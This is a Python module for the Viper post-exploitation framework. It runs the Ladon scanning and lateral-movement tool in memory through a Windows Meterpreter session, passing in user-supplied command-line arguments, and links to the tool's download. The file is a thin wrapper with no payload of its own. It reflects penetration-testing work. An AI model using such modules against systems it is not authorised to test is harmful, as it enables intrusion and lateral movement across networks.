# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "Ladon7.0 C#插件"
    DESC_ZH = "模块内存执行Ladon的C#版本exe.模块所需的exe下载于如下链接:(解压密码k8gege.org)\n" \
              "https://github.com/k8gege/Ladon/releases/download/v7.0/Ladon7.0.rar\n" \
              "因Ladon不完全开源,Viper不保证内置Ladon-N20.exe及Ladon-N40.exe的安全性,\n" \
              "建议自行上传对应exe到<文件列表>"
    WARN_ZH = "模块可能存在安全风险,请参考说明"

    NAME_EN = "Ladon7.0 C# plugin"
    DESC_EN = "The module memory executes Ladon's C# version exe. The exe required by the module is downloaded from the following link: (unzip password k8gege.org)\n" \
              "https://github.com/k8gege/Ladon/releases/download/v7.0/Ladon7.0.rar\n" \
              "Because Ladon is not completely open source, Viper does not guarantee the safety of the built-in Ladon-N20.exe and Ladon-N40.exe.\n" \
              "It is recommended to upload the corresponding exe to <Files> by yourself"
    WARN_EN = "The module may have security risks, please refer to the instructions"

    MODULETYPE = TAG2TYPE.Lateral_Movement
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/dkneiv"]
    REFERENCES = ["https://k8gege.org/Ladon/", "https://github.com/k8gege/Ladon"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionStr(name='args', name_tag="命令行参数", required=True,
                  desc="输入执行Ladon.exe时的命令行参数.可参考:https://k8gege.org/Ladon/",
                  option_length=24),
        OptionInt(name='wait', name_tag="等待时间", required=True,
                  desc="读取输出信息前等待的秒数", default=10),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter"

        self.set_assembly("Ladon")
        self.set_execute_wait(self.param("wait"))
        self.set_arguments(self.param("args"))
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_raw(assembly_out)
